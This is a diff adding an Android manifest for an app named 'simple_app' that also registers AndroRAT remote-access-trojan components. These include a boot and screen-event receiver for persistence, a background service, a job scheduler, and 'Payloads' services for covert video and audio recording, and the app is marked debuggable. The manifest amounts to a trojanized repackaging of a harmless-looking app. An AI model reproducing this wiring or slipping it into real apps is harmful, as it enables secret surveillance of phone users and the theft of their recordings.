@@ -1,0 +1,31 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="32" android:compileSdkVersionCodename="12" package="com.example.simple_app" platformBuildVersionCode="32" platformBuildVersionName="12">
+<uses-sdk android:minSdkVersion="22" android:targetSdkVersion="32"> </uses-sdk>
+<application android:theme="@7F11023D" android:label="@7F10001D" android:icon="@7F0D0000" android:debuggable="true" android:allowBackup="true" android:supportsRtl="true" android:roundIcon="@7F0D0001" android:appComponentFactory="androidx.core.app.CoreComponentFactory">
+<activity android:theme="@7F11023F" android:label="@7F10001D" android:name="com.example.simple_app.MainActivity" android:exported="true">
+<intent-filter>
+<action android:name="android.intent.action.MAIN"> </action>
+<category android:name="android.intent.category.LAUNCHER"> </category>
+</intent-filter>
+</activity>
+  
+<activity android:name="com.example.androrat.MainActivity" android:exported="true"> </activity>
+<service android:name="com.example.androrat.mainService" android:enabled="true" android:exported="false"> </service>
+<receiver android:name="com.example.androrat.broadcastReciever" android:enabled="true" android:exported="true">
+<intent-filter>
+<action android:name="android.intent.action.BOOT_COMPLETED"> </action>
+<action android:name="android.intent.action.SCREEN_OFF"> </action>
+<action android:name="android.intent.action.SCREEN_ON"> </action>
+</intent-filter>
+</receiver>
+<service android:name="com.example.androrat.jobScheduler" android:permission="android.permission.BIND_JOB_SERVICE"> </service>
+<service android:name="com.example.androrat.Payloads.videoRecorder"> </service>
+<service android:name="com.example.androrat.Payloads.audioManager"> </service>
+  
+<provider android:name="androidx.startup.InitializationProvider" android:exported="false" android:authorities="com.example.simple_app.androidx-startup">
+<meta-data android:name="androidx.emoji2.text.EmojiCompatInitializer" android:value="androidx.startup"> </meta-data>
+<meta-data android:name="androidx.lifecycle.ProcessLifecycleInitializer" android:value="androidx.startup"> </meta-data>
+</provider>
+<uses-library android:name="androidx.window.extensions" android:required="false"> </uses-library>
+<uses-library android:name="androidx.window.sidecar" android:required="false"> </uses-library>
+</application>
+</manifest>
